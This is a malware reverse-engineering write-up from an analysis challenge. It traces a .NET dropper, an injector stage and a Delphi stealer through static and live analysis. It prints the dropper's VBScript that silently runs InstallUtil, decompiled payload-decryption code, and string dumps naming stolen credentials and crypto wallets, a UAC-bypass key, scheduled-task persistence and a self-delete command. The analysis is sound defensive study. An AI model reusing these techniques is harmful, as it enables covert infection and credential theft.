--- Main ---

The malware sample belongs to a technical challenge. Manual offline analysis performed, as per request. This does not represent a "product" or "blog post." Instead, I focused on demonstrating my RE approach.

Original file name and MD5: ADFA7BF0E84BA6900860A84BA64787A8
SHA1: 0A7EE28F30A444A24708C662AA3CFA555445F18D
File size: 207 KB

Test machine: Windows 10 Pro 64-bit (10.0, Build 17134), 8192MB RAM, English
Virtualization: VMWare Workstation 15 Pro 15.1.0 build-13591040

Comments: In this assessment, this is the first (1) sample I worked with.


--- Static Analysis ---

CFF Explorer and PEiD agree the sample is a 32-bit Microsoft Visual Studio .NET executable. Furthermore, the mscoree.dll dependency supports .NET executable as do various strings and GUI code. Initial .NET analysis fails in ILSpy and JustDecompile, indicating the file is obfuscated/packed/protected.

Interesting attributes:

	Suspicious file header contains compiler-stamp 0x0ABCDEF0 that resolves to an old date of Tue Sep 16 21:40:00 1975.

	Suspicious file name in header: yYsdCQtABm.exe.
	
	Suspicious company and product names (Bluetech Software Ltd. returns few, if any, related Google search results):

		CompanyName = "Bluetech Software Ltd."
		FileDescription = "Bluesoft Event Viewer"
		Bluesoft Event Viewer
		ProductName = "Event Viewer utility"
		FileVersion, AssemblyVersion, ProductVersion = "3.3.0.2"

File protection/packing/compression:
	
	Possible packers:  Cassandra Crypter (contains "CryptedByCassandraCrypter"), ConfuserEx (contains string "ConfuserEx.v1.0.0-custom")
	NoFuserEx-Reborn fails to recognize ConfuserEx: "ConfuserEx doesn't detected. Use de4dot."
	de4dot fails to recognize packer ("detected unknown obfuscator") but successfully unpacks.
	File size after de4dot unpack = 190 KB
	de4dot-unpacked executable successfully opens in dnSpy, ILSpy, etc.

Interesting resources and strings:
	
	Suspicious default compiler application name: MyApplication.app.
	
	One resource is a 156 KB PNG image. When extracted, it appears to be visual noise (invalid image). This may be a disguised and encrypted malicious payload.
	Evasion technique: larger file sizes can trick users into thinking an application is more legitimate.

	The following string is associated with the PNG resource:
	HrVAkPvR3L2GKknpqwbwVg05haVqMmTL8xWlirCQh05G5pOPX33QqwMWs0ciCvFRfaGvMue5g5X5kd8	
	Via dnSpy, the string above is defined as string_0 in within Class7.	
	Suspicious: further tracing in dnSpy reveals multiple GClass1 methods (method_0, method_1, method_2, and method_3) that access, decrypt, and execute the PNG payload. This behavior is consistent with anti-dump described at https://webcache.googleusercontent.com/search?q=cache:szstDCFYrrMJ:https://hackforums.net/showthread.php%3Ftid%3D5623525+&cd=3&hl=en&ct=clnk&gl=us&client=firefox-b-1-d. For example, the byte array in the target file decodes (from decimal) to "EntryPoint".
 
	Suspicious: the executable contains another resource: a VBScript that runs a .NET utility called InstallUtil.exe:

		strs = str()
		obj()

		function obj()
			CreateObject("WScript.Shell").run strs,0,false
		end function

		function str()
			tr = "%windir%\Microsoft.NET\Framework\v4.0.30319\installutil /logtoconsole=false /logfile= /u " & Chrw(34) & "%path%" & Chrw(34)
			str = tr
		end function
	
	The VBScript executes a file via replacing %path% and using ScriptControl.AddCode() as documented by Kaspersky Labs here: https://securelist.com/using-legitimate-tools-to-hide-malicious-code/83074/. In the sample, ScriptControl.AddCode() occurs in GControl1.ctor().
	
	Evasion technique: InstallUtil.exe can be used to run malware as a Windows service. Windows services run at a different privilege or access level and can be more difficult to analyze.	
	
	Evasion technique: launching a new process can complicate analysis because the new process will not have a debugger attached, for example.


--- Live Analysis ---

For live analysis, I have named the sample mw1.exe.

Based on the static analysis, we can learn more from Sysinternals Process Monitor with "include filters" for:

	Process Name is installutil.exe
	Process Name is mw1.exe
	Operation is Load Image
	Operate is CreateFile

Process Monitor confirms the above observation that InstallUtil.exe is launched with arguments as follows:

	"C:\WINDOWS\Microsoft.NET\Framework\v4.0.30319\installutil.exe" /logtoconsole=false /logfile= /u "C:\Users\admin\Desktop\mw1.exe"
	
Note the /u above. This runs mw1.exe with uninstall. The mw1.exe will run its uninstall routine, which will likely run the malware code. This is unusual because a normal service or new software would be "installed" first.
	
Looking back at GClass1 with dnSpy's analyzer, we further confirm the malicious uninstall routine:

	GClass0.System.Configuration.Install.Installer.Uninstall(IDictionary) : void @06000028
	
	// GClass0
	// Token: 0x06000028 RID: 40 RVA: 0x000027B8 File Offset: 0x000009B8
	public virtual void Uninstall(IDictionary savedState)
	{
		GClass1 gclass = new GClass1();
		gclass.method_0(gclass.method_1(Class7.string_0));
	}	


gclass.method_0() eventually calls code that decrypts the malicious payload that is disguised as a PNG.

dnSpy fails to debug mw1.exe properly as a service. mw1.exe and its payload(s) may use considerable anti-debug. Rather than porting over all the C# to my own decryption project, I want to see if can get mw1.exe will do the work for me. I opt for a pause and dump option by using dnSpy to patch in a C# call to MessageBox.Show(), as this should pause the process and allow for attaching a debugger with anti-debug plugins (i.e. x32dbg and ScyllaHide). If we see a message box, we will know if the payload is executed at a "natural" runtime.

Here is my patch:

	// Below, only two lines of code were added where appropriate.

	using System;
	using System.Drawing;
	using System.Windows.Forms;  // Added by me

	// Token: 0x0200000D RID: 13
	public partial class GClass1
	{
		// Token: 0x06000036 RID: 54
		private byte[] method_2(byte[] byte_0)
		{
			checked
			{
				byte[] array = new byte[byte_0.Length - 16 - 1 + 1];
				Buffer.BlockCopy(byte_0, 16, array, 0, array.Length);
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					byte[] array2 = array;
					int num2 = i;
					array2[num2] ^= byte_0[i % 16];
				}
				MessageBox.Show("Hello world.", "Just wanted to say...", MessageBoxButtons.OK);  // Added by me
				return array;
			}
		}
	}


Does it work?

Yes, the message box displays. With the message box displaying, we can now attach a debugger. Using x32dbg, I placed a breakpoint on the RET instruction for MessageBoxW. This breakpoint should pause the debugger when clicking OK to the message box. As anticipated, the MessageBoxW breakpoint triggers.

At this moment, my theory is that we should see signs of a malicious payload. After all, we patched in the message box right before the sensitive return. We may see the decoded payload, strings, or other clues.

Viewing the above .NET code, we know an array is returned. We know that on x86, we often have to trace through multiple RET instructions until we arrive at the "main code" of the application. We also know that on x86 applications, we can look at the EAX register for return values or return pointers. 

Tracing through, we encounter multiple RET instructions. Eventually, we land in a unique memory area outside of .NET libraries. This memory area has execute, read, and write protection (ERW). This combination is often seen in shellcode. However, this does not appear shellcode because the memory region is quite large (0x4000 bytes) and there are multiple direct calls to .NET libraries. Calling those various library functions from shellcode would be rather complex. Checking EAX in x32dbg's memory dump view reveals a PE header. We can see the "MZ", "This program cannot be run in DOS mode.", etc. This may be the payload we have been searching for! Using x32dbg, we can easily dump the memory area (From MZ onwards) to disk for further analysis. 

I saved the dump as mw2.bin. On disk, the file is 146 KB. In comparison, mw1.exe is 206 KB.


--- Static Analysis ---

According to the following, mw2.bin appears to be a malicious Visual Basic .NET executable.

A selection of ASCII strings:

	000204B1  CyaX.exe
	000204BA  CyaX
	000204CF  Microsoft.VisualBasic
	0002050C  advapi32.dll
	00020519  kernel32.dll
	00020526  user32.dll
	00020551  CyaX.Resources.resources
	0002056A  3GtqDc0bNBj.resources
	00020580  <Module>
	00020589  MyApplication
	000206C7  m_ComputerObjectProvider
	000206E0  m_AppObjectProvider
	000206F4  m_UserObjectProvider
	00020709  User
	0002070E  m_MyFormsObjectProvider
	00020726  m_MyWebServicesObjectProvider
	0002074B  get_GetInstance
	0002075B  get_Computer
	00020768  get_Application
	00020778  get_User
	00020781  get_Forms
	0002078B  get_WebServices
	000207DF  WebServices
	000208C4  get_IsDisposed
	000208FC  ContainsKey
	00020A3C  GetHashCode
	00020A50  ToString
	00020A74  MyWebServices
	00020BDD  GetString
	00020BE7  get_XML
	00020CA1  get_Settings
	00020CBD  GetUserName
	00020CED  GetModuleHandle
	00020CFD  lpModuleName
	00020D4F  GetFileAttributes
	00020D91  CompareString
	00020E96  AntiVM
	00020E9D  RegistryKey
	00020EB9  Registry
	00020EC2  LocalMachine
	00020ECF  OpenSubKey
	00020F75  DEmulation
	00020F80  ProcessElevation
	00020F91  GetKernelObjectSecurity
	00020FF0  SetKernelObjectSecurity
	00021008  GenericSecurityDescriptor
	00021022  System.Security.AccessControl
	00021040  get_BinaryLength
	00021056  GetBinaryForm
	00021064  Win32Exception
	0002109C  processHandle
	0002110F  PROCESS_ALL_ACCESS
	00021122  PROCESS_CREATE_PROCESS
	00021139  PROCESS_CREATE_THREAD
	0002114F  PROCESS_DUP_HANDLE
	00021162  PROCESS_QUERY_INFORMATION
	0002117C  PROCESS_QUERY_LIMITED_INFORMATION
	0002119E  PROCESS_SET_INFORMATION
	000211B6  PROCESS_SET_QUOTA
	000211C8  PROCESS_SUSPEND_RESUME
	000211DF  PROCESS_TERMINATE
	000211F1  PROCESS_VM_OPERATION
	00021206  PROCESS_VM_READ
	00021216  PROCESS_VM_WRITE
	00021227  READ_CONTROL
	00021234  STANDARD_RIGHTS_REQUIRED
	0002124D  SYNCHRONIZE
	00021259  WRITE_DAC
	0002130B  DeleteFile
	00021316  Concat
	00021379  Unscramble
	00021389  GetExecutingAssembly
	0002139E  GetObject
	000213A8  loadresource
	000213B5  resname
	000213BF  PayLoad
	000213CC  InjectValue
	000213D8  isStartup
	000213E2  StartupName
	000213F2  Downloader
	000213FD  DownloaderFileName
	00021410  DownloaderLink
	0002141F  AntiVm
	00021426  AntiEm
	0002142D  Strings
	00021435  Split
	0002143B  CompareMethod
	00021449  Process
	00021451  GetCurrentProcess
	00021463  get_Handle
	00021590  BypassUAC
	000215A1  DirectoryInfo
	000215AF  DirectorySecurity
	000215C1  get_UserName
	000215CE  FileSystemInfo
	000215DD  set_Attributes
	000215EC  FileAttributes
	000215FB  FileSystemAccessRule
	00021610  FileSystemRights
	00021621  InheritanceFlags
	00021632  PropagationFlags
	00021643  AccessControlType
	00021655  FileSystemSecurity
	00021668  AddAccessRule
	00021676  SetAccessControl
	00021687  ProtectTheFile
	000216EC  Path
	000216F1  GetTempFileName
	00021701  Replace
	00021745  Delete
	0002174C  Startup
	00021754  startupname
	00021760  filepath
	00021769  WebClient
	0002177E  GetTempPath
	0002178A  DownloadFile
	00021797  Sdownload
	000217A6  filerun
	000217AE  SmartInject
	000217C0  get_ExecutablePath
	00021802  GetInjectionPath
	00021813  Target
	0002181A  CreateProcess
	00021828  applicationName
	00021838  commandLine
	0002193E  Wow64SetThreadContext
	00021954  ReadProcessMemory
	00021996  WriteProcessMemory
	000219A9  bytesWritten
	000219B6  NtUnmapViewOfSection
	000219CB  VirtualAllocEx
	000219EF  ResumeThread
	00021A0B  antimemscan
	00021A81  GetProcessById
	00021A90  Kill
	00021AAE  AntiMemScan
	00021ABA  DebugActiveProcess
	00021ACD  dwProcessId
	00021AD9  NtResumeThread
	00021AF7  WaitForDebugEvent
	00021B54  VirtualProtectEx
	00021B65  hProcess
	00021B6E  dwAddress
	00021C78  DebugEventType
	00021C87  CREATE_PROCESS_DEBUG_EVENT
	00021CA2  CREATE_THREAD_DEBUG_EVENT
	00021CBC  EXCEPTION_DEBUG_EVENT
	00021CD2  EXIT_PROCESS_DEBUG_EVENT
	00021CEB  EXIT_THREAD_DEBUG_EVENT
	00021D03  LOAD_DLL_DEBUG_EVENT
	00021D18  OUTPUT_DEBUG_STRING_EVENT
	00021D32  RIP_EVENT
	00021D3C  UNLOAD_DLL_DEBUG_EVENT
	00021D53  DEBUG_EVENT
	00021D5F  dwDebugEventCode
	00021D70  debugInfo


A selection of Unicode strings:

	000027A8  3GtqDc0bNBj
	000223A2  CyaX.Resources
	000223E0  USER
	000223EA  SANDBOX
	000223FA  VIRUS
	00022406  MALWARE
	00022416  SCHMIDTI
	00022428  CURRENTUSER
	00022440  \VIRUS
	0002244E  SAMPLE
	0002245C  C:\file.exe
	00022474  Afx:400000:0
	0002248F  HARDWARE\DEVICEMAP\Scsi\Scsi Port 0\Scsi Bus 0\Target Id 0\Logical Unit Id 0
	00022529  Identifier
	0002253F  VBOX
	00022549  HARDWARE\Description\System
	00022581  SystemBiosVersion
	000225A5  VideoBiosVersion
	000225C7  VIRTUALBOX
	000225DD  SOFTWARE\Oracle\VirtualBox Guest Additions
	00022635  noValueButYesKey
	00022657  VMWARE
	00022665  SOFTWARE\VMware, Inc.\VMware Tools
	000226AC  HARDWARE\DEVICEMAP\Scsi\Scsi Port 1\Scsi Bus 0\Target Id 0\Logical Unit Id 0
	00022747  HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Logical Unit Id 0
	000227E1  SYSTEM\ControlSet001\Services\Disk\Enum
	00022835  vmware
	00022844  SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000
	000228E2  DriverDesc
	000228F9  SYSTEM\ControlSet001\Control\Class\{4D36E968-E325-11CE-BFC1-08002BE10318}\0000\Settings
	000229A9  Device Description
	000229CF  InstallPath
	000229E7  C:\PROGRAM FILES\VMWARE\VMWARE TOOLS\
	00022A33  kernel32.dll
	00022A4D  wine_get_unix_file_name
	00022A7D  QEMU
	00022A87  \\.\ROOT\cimv2
	00022AA5  SELECT * FROM Win32_VideoController
	00022AED  Description
	00022B05  VM Additions S3 Trio32/64
	00022B39  S3 Trio32/64
	00022B53  VirtualBox Graphics Adapter
	00022B8B  VMware SVGA II
	00022D98  LirXvzeU
	00022DAA  windir
	00022DB8  \debug\WIA\
	00022DD4  .exe
	00022DDE  %SystemRoot%\system32\mmc.exe
	00022E1A   "%1" %*
	00022E2C  Software\Classes\mscfile\shell\open\command
	00022E84  eventvwr.exe
	00022E9E  [LOCATION]
	00022EB4  [USERID]
	00022EC6  schtasks.exe
	00022EE0  /Create /TN "Updates\
	00022F0C  " /XML "
	00022F22  MSBuild.exe
	00022F3A  RegAsm.exe
	00022F50  RegSvcs.exe
	00022F68  jsc.exe
	00023D84  Bonjour Namespace Provider
	00023DC2  CompanyName
	00023DDC  Apple Inc.
	00023DFA  FileDescription
	00023E1C  Bonjour Libraries
	00023E46  FileVersion
	00023E60  3.1.0.0
	00023E76  InternalName
	00023E90  CyaX.exe
	00023EAA  LegalCopyright
	00023EC8  Copyright (c) 2003-2015 Apple Inc.
	00023F16  LegalTrademarks
	00023F42  OriginalFilename
	00023F64  CyaX.exe
	00023F7E  ProductName
	00023F98  Bonjour
	00023FAE  ProductVersion
	00023FCC  3.1.0.0
	00023FE2  Assembly Version
	00024004  3.1.0.0


	The strings suggest the following:
	
	- The file is not packed/protected.
	- The file is a .NET Visual Basic application.
	- The file is malware.
	- The malware, which I will call CyaX.exe or CyaX from this point forward, masquerades as the Apple Bonjour application.
	- Thorough anti-VM checks for VMware and VirtualBox that include associated display drivers. See AntiVm as well.
	- Self-protection: AntiMemScan, Unscramble, 
	- Bypassing of Windows UAC, privlege escalation, system profiling, and reboot persistence
	- This is a highly versatile malware utility: Windows process, module, thread, and memory manipulation, injection, process termination, debugging, file execution and i/o, command line interaction, and web access.
	
As expected, CyaX does not resist dnSpy's decompilation.

Within dnSpy, we can see 3GtqDc0bNBj is a resource; likely another payload! Reviewing the dumped 3GtqDc0bNBj file, we can see structure indicators followed by increased entropy. No legible strings. CyaX likely decodes this file. One or more strings above suggest this.

CyaX's four main classes are organized as follows.

	Antis:
		
		AntiSB(): returns true if a Sandboxie component is detected.
		AntiVM(): returns true if a VM component is detected.
		DEmulationFindWindow(): a timing function to detect analysis.
		GetFileAttributes(): basically, a simplified Windows API import.
		GetModuleHandle(): basically, a simplified Windows API import.
		GetProcAddress(): basically, a simplified Windows API import.
		GetUserName(): basically, a simplified Windows API import.
		regGet(): used for reading the Windows registry.
	
	Extra:
		
		DeleteFile(): self-explanatory.
		DeleteZoneID(): gets information about a file (possibly a downloaded file or the file that launched CyaX).
		loadresource(): loads a resource file (likely the 3GtqDc0bNBj payload).
		protectProc(): elevates (and thereby protects) a Windows process. (Note to self: disable this as well as the Antis if live analysis is required).
		Unscramble(): decrypts the payload using the same method as in mw1.exe. Note to self: private static byte[] PayLoad = Extra.Unscramble(Extra.loadresource("3GtqDc0bNBj"));
		
	ProcessElevation:
		
		(Self-explanatory. We can expect the the payload to receive elevation.)
		
	X:
	
		(Contains anti-debug, process/thread/memory manipulation, debugging, and injection, remote file downloading, UAC bypass, etc. as noted previously.)
		(Worth noting here is that X.Run() will run a file at a given path, patch the file's process memory using a byte array, and then optionally protect the memory of the process by attaching as a debugger.)
		
The next step is to get a sense of what happens when CyaX is executed. The X.Main() method is quite lengthy, so here is the gist:

	1. X.Main() accepts one argument: a string array as args[]. The variable "text" is args[0].
	2. Self-protection.
	3. Sleep for 30 seconds.
	4. Anti-debug and UAC bypass.
	5. File path activity related to C:\WINDOWS\debug\WIA\. %appdata% folder is used as an alternative.
	6. The variable "text3" gets assigned the path from the previous plus a static string, i.e. "C:\WINDOWS\debug\WIA\LirXvzeU.exe".
	7. If the text and text3 strings are not the same, create persistence via Windows Task Scheduler (schtasks.exe) task called LirXvzeU.
	8. Download a file to the Windows temporary path directory and run it. I believe the server information was removed in this sample.
	9. Decrypt the resource payload as byte[], get CyaX's path, run and inject the payload into another instance of CyaX. This coincides with #7 above.
	
While I could go into further detail describing CyaX, this should suffice. The next step is to decrypt the 3GtqDc0bNBj payload. 

I have used the same message box patch and dump technique. I saved the dump as mw3.bin.


--- Static Analysis ---

According to the following, mw3.bin appears to be a malicious Visual Basic .NET executable. Unlike the other executables examined thus far, there is no resource section, but this does not mean a payload is not obscured somewhere or downloaded remotely.

A selection of ASCII strings:

	00001F5C  SOFTWARE\Borland\Delphi\RTL
	00004429  GlobalVars
	0000443C  DV8CF101-053A-4498-98VA-EAB3719A088W-VF9A8B7AD-0FA0-4899-B4RD-D8006738DQCD
	00004910  SOFT:
	0000492C  HOST:
	0000493C  USER:
	0000494C  PASS:
	0000495C  UNKN:
	00004EFC  GetComputerNameW
	00004F24  CreateFileW
	00004F30  GetFileSize
	00004F68  CreateMutexA
	00004F98  GetCurrentDirectoryW
	00004FB0  SetEnvironmentVariableW
	00004FE0  FindFirstFileW
	00004FF0  FindNextFileW
	00004FE0  FindFirstFileW
	00004FF0  FindNextFileW
	0000500C  GetTickCount
	0000501C  CopyFileW
	00005068  Process32FirstW
	00005078  Process32NextW
	00005088  GetModuleFileNameW
	00005108  GetLogicalDriveStringsA
	00005120  GetDriveTypeA
	00005130  CreateProcessW
	00005160  RegCreateKeyExW
	00005170  RegQueryValueExW
	00005184  RegCloseKey
	00005190  RegOpenKeyExW
	000051A0  AllocateAndInitializeSid
	000051BC  LookupAccountSidA
	000051D0  CreateProcessAsUserW
	00005200  RegOpenKeyW
	0000520C  RegEnumKeyW
	00005218  RegEnumValueW
	00005228  CryptAcquireContextA
	00005240  CryptCreateHash
	00005250  CryptHashData
	00005260  CryptGetHashParam
	00005274  CryptDestroyHash
	00005288  CryptReleaseContext
	000052BC  wvsprintfA
	000052C8  GetKeyboardLayoutList
	000052EC  ShellExecuteExW
	000073B4  WTSGetActiveConsoleSessionId
	00009AD0  CryptUnprotectData
	0000B238  InternetExplorer
	0000B296  PVAULT_CRED8
	0000B2B2  EdgePwds
	0000B5FD  outlookDecrU
	0000BD6C  Outlook
	0000C768  WinSCP
	0000D4C0  Pidgin
	0000D4DC  </account>
	0000D4F0  <account>
	0000F448  1610149366
	00011C44  SELECT DATETIME(moz_historyvisits.visit_date/1000000, "unixepoch", "localtime"),moz_places.title,moz_places.url FROM moz_places, moz_historyvisits WHERE moz_places.id = moz_historyvisits.place_id ORDER By moz_historyvisits.visit_date DESC LIMIT 0, 10000
	0001207C  SELECT DATETIME( ((visits.visit_time/1000000)-11644473600),"unixepoch") , urls.title , urls.url FROM urls, visits WHERE urls.id = visits.url ORDER By  visits.visit_time DESC LIMIT 0, 10000
	00012FD4  Browsers\Cookies
	00012FFC  Browsers\History
	0001334D  uFileFinderU
	00014F88  U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxs
	00014FD8  RGlzcGxheU5hbWU=
	00014FF4  U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cVW5pbnN0YWxsXA==
	00015050  RGlzcGxheVZlcnNpb24=
	00015400  UHJvY2Vzc29yTmFtZVN0cmluZw==
	00015428  SEFSRFdBUkVcREVTQ1JJUFRJT05cU3lzdGVtXENlbnRyYWxQcm9jZXNzb3JcMA==
	00015480  CPU Count: 
	00015494  GetRAM: 
	000159DC  Q3JlYXRlVG9vbGhlbHAzMlNuYXBzaG90
	00015A18  UHJvY2VzczMyRmlyc3RX
	00015A38  UHJvY2VzczMyTmV4dFc=
	0001608C  MachineID :   
	000160B0  EXE_PATH  :   
	000160D8  Windows    :   
	00016110  Computer(Username) :   
	00016140  Screen: 
	0001615C  Layouts: 
	00016170  LocalTime: 
	00016184  Zone: 
	000162CD  GDIScreenShot
	0001676C  GdipCreateBitmapFromHBITMAP
	00016A30  DnsQuery_A
	00016A3C  dnsapi.dll
	00016BFC  https://dotbit.me/a/
	00017048  wsock32.dll
	00017054  WSAStartup
	0001705F  gethostbyname
	0001706D  socket
	00017074  send
	00017079  recv
	0001707E  htons
	00017084  connect
	0001708C  closesocket
	000170B0   HTTP/1.0
	000170C4  Host: 
	000170E0  Connection: close
	000170FC  User-agent: 
	00017114  Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
	00017150  Content-Length: 
	0001764F  ZYYd
	000176AC  POST
	000176BC  wininet.dll
	000176C8  InternetOpenA
	000176D6  InternetConnectA
	000176E7  HttpOpenRequestA
	000176F8  HttpAddRequestHeadersA
	0001770F  HttpSendRequestA
	00017720  InternetReadFile
	00017731  InternetCloseHandle
	00017745  InternetCrackUrlA
	00017757  InternetSetOptionA
	00017774  .bit
	00017784  Host: 
	0001778C  Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
	PasswordsList.txt
	000191A4  scr.jpg
	000191C0  %DSK_
	00019210  Files\
	00019238  http://ip-api.com/json
	00019264  "query":"
	00019278  "countryCode":"
	0001929C  ip.txt
	000192AC  System.txt
	0001A126  WideCharToMultiByte
	0001A13C  MultiByteToWideChar


A selection of Unicode strings:

	00006380  MachineGuid
	00008D74  %TEMP%\2fda\
	00008D94  %appdata%\2fda\
	00008DB4  PATH
	00008F80  %TEMP%\
	0000BCDC  Email
	0000BCFC   User
	0000BD0C   Server
	0000BD20   Port
	0000BD30   Password
	0000C69C  Software\Martin Prikryl\WinSCP 2\Sessions\
	0000C6F8  HostName
	0000C710  PortNumber
	0000C72C  UserName
	0000C744  Password
	0000CCE8  </jid>
	0000CCFC  <jid type="QString">
	0000CD2C  </password>
	0000CD48  <password type="QString">
	0000D158  %Appdata%\Psi+\profiles\
	0000D190  \*.*
	0000D1A0  \accounts.xml
	0000D1D0  %Appdata%\Psi\profiles\
	0000D3F0  </account>
	0000D40C  <account>
	0000D424  </name>
	0000D438  <name>
	0000D44C  </password>
	0000D468  <password>
	0000D484  </protocol>
	0000D4A0  <protocol>
	0000D564  %APPDATA%\.purple\accounts.xml
	0000DCAC  %TEMP%\curbuf.dat
	0000EF14  \Cookies
	00012404  \History
	00012424  .txt
	000126A8  \*.*
	000126C0  \places.sqlite
	000126EC  .txt
	00013DF8  %APPDATA%\Skype
	00013E30  main.db
	00013E44  \main.db
	00014110  SteamPath
	00014128  Software\Valve\Steam
	00014168  \ssfn*
	0001417C  \Config\*.vdf
	0001419C  \Config\
	000147F8  %APPDATA%\
	00014828  .wallet
	0001483C  \.wallet
	00014854  wallet.dat
	00014870  \wallet.dat
	0001488C  electrum.dat
	000148AC  \electrum.dat
	000148CC  wallet_path
	000148E8  Software\monero-project\monero-core
	00014934  \Monero\
	0001494C  .address.txt
	0001496C  .keys
	0001497C  strDataDir
	00014998  Software\Bitcoin\Bitcoin-Qt
	000149D4  \BitcoinCore_custom\wallet.dat
	000153E0  CPU Model: 
	00018DC8  Coins
	00018DD8  Coins\Electrum
	00018E04  %appdata%\Electrum\wallets\
	00018E40  Coins\Electrum-LTC
	00018E6C  %appdata%\Electrum-LTC\wallets\
	00018EB0  Coins\Ethereum
	00018ED4  UTC*
	00018EE4  %APPDATA%\Ethereum\keystore\
	00018F24  Coins\Exodus
	00018F44  *.json,*.seco
	00018F64  %APPDATA%\Exodus\
	00018F8C  Coins\Jaxx\Local Storage\
	00018FC4  %APPDATA%\Jaxx\Local Storage\
	00019004  Coins\MultiBitHD
	0001902C  mbhd.wallet.aes,mbhd.checkpoints,mbhd.spvchain,mbhd.yaml
	000190A4  %APPDATA%\MultiBitHD\
	000190E0  Skype
	000190F0  Telegram
	00019108  D877F783D5*,map*
	00019130  %appdata%\Telegram Desktop\tdata\
	00019178  Steam
	00019184  image/jpeg
	000193B8  %comspec%
	000193D0  /c %WINDIR%\system32\timeout.exe 3 & del "


The strings suggest the following:
	
	- PE executable written in Delphi (confirmed by CFF Explorer and PEiD as well).
	
	- Significant data exfiltration (theft) with API functions for crawling the compromised system.
	
	- Targets: cryptocurrency wallets, games, passwords, browser activity (e.g. local Firefox activity database SQL queries), screen capture, chat applications, and system profiling. The Base64 strings are mainly for system profiling.
	
	- Remote HTTP communication, potentially DNS, etc. for transferring sensitive harvested data.
	
	- Some C2 (command and control) characteristics.
	
	- Screenshot espionage.
	
	- Due to the "crypt" APIs, there may be a ransomware component or ransomware. However, there are no plaintext telltale signs of ransomware such as, "Your system is compromised. Send us crypto at this address." Note: further analysis should attempt to rule out ransomware. Also, it is conceivable that ransomware could be remotely downloaded and dropped after stealing personal data.	
	
We can easily check the strings online to see if this is a known sample and understand its classification. However, I have not done this out of respect of the challenge.

Let's open it in IDA and go to the entry point:

	CODE:0041A1F8                 public start
	CODE:0041A1F8 start:
	CODE:0041A1F8                 push    ebp
	CODE:0041A1F9                 mov     ebp, esp
	CODE:0041A1FB                 add     esp, 0FFFFFFF0h
	CODE:0041A1FE                 mov     eax, offset dword_41A090
	CODE:0041A203                 call    @Sysinit@@InitExe$qqrpv ; Sysinit::__linkproc__ InitExe(void *)
	CODE:0041A208                 mov     eax, offset _str_E_0.Text
	CODE:0041A20D                 call    sub_4186C4
	CODE:0041A212                 call    @System@@Halt0$qqrv ; System::__linkproc__ Halt0(void)
	CODE:0041A212 ; ---------------------------------------------------------------------------
	CODE:0041A217                 align 4
	CODE:0041A218 _str_E_0        dd 0FFFFFFFFh           ; _top
	CODE:0041A218                                         ; DATA XREF: CODE:0041A208↑o
	CODE:0041A218                 dd 1                    ; Len
	CODE:0041A218                 db 'E',0                ; Text
	CODE:0041A222                 align 200h
	CODE:0041A400                 dd 300h dup(?)
	CODE:0041A400 CODE            ends


The interesting code begins at the called 0x4186C4 offset. Tracing through statically, we can see one of the first priorities is crawling the disk for cryptocurrency wallets. Functions exist for handling Skype data (.db), Steam game configuration files(.vdf), a remote command server with references to Internet Explorer, etc. This matches the string observations. The use of timeout.exe suggest a safe way to self-delete and/or file cleanup, perhaps for an executable file or collected personal data files.


--- Live Analysis ---

The Drltrace tool (https://github.com/mxmssh/drltrace) injects Windows API logging libraries and outputs the results to a .log. Instead of providing the entire log here, I have included a few API calls worth noting:

	~~7160~~ KERNELBASE.dll!RegOpenKeyExW
		arg 0: 0x80000002 (type=<unknown>, size=0x0)
		arg 1: SOFTWARE\Microsoft\Cryptography (type=wchar_t*, size=0x0)
		arg 2: 0x0 (type=DWORD, size=0x4)
		arg 3: 0x00020119 (type=<unknown>, size=0x0)
	~~7160~~ ADVAPI32.dll!RegQueryValueExW
		arg 0: 0x00000298 (type=<unknown>, size=0x0)
		arg 1: MachineGuid (type=wchar_t*, size=0x0)
		arg 2: 0x00000000 (type=DWORD*, size=0x4)
		arg 5: 0x0019fc3c => 0xfe (type=DWORD*, size=0x4)
	~~7160~~ KERNEL32.dll!WideCharToMultiByte
		arg 0: 0x3 (type=uint, size=0x4)
		arg 1: 0x0 (type=DWORD, size=0x4)
		arg 2: 3c0ac187-3c9e-4e13-a361-01c1dff207a7 (type=wchar_t*, size=0x0)
		arg 3: 0x24 (type=int, size=0x4)
		arg 5: 0xfff (type=int, size=0x4)
	~~7160~~ WININET.dll!InternetCrackUrlA
		arg 0: 0x02550324
		arg 1: 0x00000019
	~~7160~~ WININET.dll!InternetOpenA
		arg 0: 0x0041838c
		arg 1: 0x00000000
	~~7160~~ WININET.dll!InternetSetOptionA
		arg 0: 0x00cc0004
		arg 1: 0x00000006
	~~7160~~ WININET.dll!InternetSetOptionA
		arg 0: 0x00cc0004
		arg 1: 0x00000005
	~~7160~~ WININET.dll!InternetConnectA
		arg 0: 0x00cc0004
		arg 1: 0x0019fb44
	~~7160~~ WININET.dll!HttpOpenRequestA
		arg 0: 0x00cc0008
		arg 1: 0x004182ac
	~~7160~~ WININET.dll!HttpSendRequestA
		arg 0: 0x00cc000c
		arg 1: 0x004183cc
	~~7160~~ WS2_32.dll!gethostbyname
		arg 0: 0x02550800
		arg 1: 0x0018ed70	


Seeing as we have a general guideline of APIs to watch for, we can debug for further information. By the way, I like to set a breakpoint on GetProcAddress and note any new APIs sought that went unnoticed in static analysis. Providing GetProcAddress is not performed with inline assembly or by other unconventional means, we can learn more about malware behavior. I also like setting initial breakpoints on string functions that are actually used, such as WideCharToMultiByte.

Other breakpoints worth considering:

	WideCharToMultiByte (string function)
	wsprintfa (string function)
	CreateProcessAsUserW (process launching)
	ShellExecuteExW	(process or file launching)
	gethostbyname (Internet access)
	HttpSendRequestA (Internet access)
	CryptUnprotectData (could point to another payload)


Tracing through, when we reach 0x406de0, the stack contains my test machine's unique configuration details:

	0019FC88  02470114  "3c0ac187-3c9e-4e13-a361-01c1dff207a7Windows 10 EnterpriseadminDESKTOP-SLQILPN"
	0019FC8C  02470170  "60312720"
	0019FC90  024700FC  "424BF0C4"
	0019FC94  024700E4  "16D0FCF2"
	0019FC98  024700CC  "9414907A"
	0019FC9C  024700B4  "D9FCF8FA"
	
